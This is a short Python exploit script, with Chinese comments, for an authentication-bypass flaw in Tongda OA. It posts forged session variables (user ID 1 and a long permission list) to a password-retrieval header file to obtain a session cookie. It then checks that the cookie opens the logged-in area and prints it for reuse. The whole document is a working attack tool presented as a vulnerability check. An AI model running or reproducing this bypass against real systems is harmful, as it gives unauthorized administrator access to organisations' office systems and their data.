###通达OA header绕过登录漏洞
###writer： summerainX
###脚本使用方式 python tongda_oa_header_bypass.py -u  url

import requests,argparse

#利用获取cookie
def get_session(url):
    header = {
        "Content-Type":"application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests":"1",
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0"
    }
    data = {
        "_SESSION[LOGIN_THEME]":"15",
        "_SESSION[LOGIN_USER_ID]":"1",
        "_SESSION[LOGIN_UID]":"1",
        "_SESSION[LOGIN_FUNC_STR]":"1,3,42,643,644,634,4,147,148,7,8,9,10,16,11,130,5,131,132,256,229,182,183,194,637,134,37,135,136,226,253,254,255,536,24,196,105,119,80,96,97,98,114,126,179,607,539,251,127,238,128,85,86,87,88,89,137,138,222,90,91,92,152,93,94,95,118,237,108,109,110,112,51,53,54,153,217,150,239,240,218,219,43,17,18,19,15,36,70,76,77,115,116,185,235,535,59,133,64,257,2,74,12,68,66,67,13,14,40,41,44,75,27,60,61,481,482,483,484,485,486,487,488,489,490,491,492,120,494,495,496,497,498,499,500,501,502,503,505,504,26,506,507,508,515,537,122,123,124,628,125,630,631,632,633,55,514,509,29,28,129,510,511,224,39,512,513,252,230,231,232,629,233,234,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,200,202,201,203,204,205,206,207,208,209,65,187,186,188,189,190,191,606,192,193,221,550,551,73,62,63,34,532,548,640,641,642,549,601,600,602,603,604,46,21,22,227,56,30,31,33,32,605,57,609,103,146,107,197,228,58,538,151,6,534,69,71,72,223,639,"
    }
    try:
        response =requests.post(url +"/module/retrieve_pwd/header.inc.php",data=data,headers=header)
        return response.headers["Set-Cookie"]
    except:
        print("漏洞不存在!")

#检测cookie是否有效
def test_cookie(url,cookie):
    if cookie != None:
        try:
            response = requests.get(url+"/general/",headers={"Cookie":cookie})
            if "用户未登录" not in response.text:
                print("漏洞存在！ 您可用的cookie为："+cookie)
        except:
            print("漏洞不存在！")


if __name__=="__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='输入目标网站域名')
    args = parser.parse_args()
    test_cookie(args.url,get_session(args.url))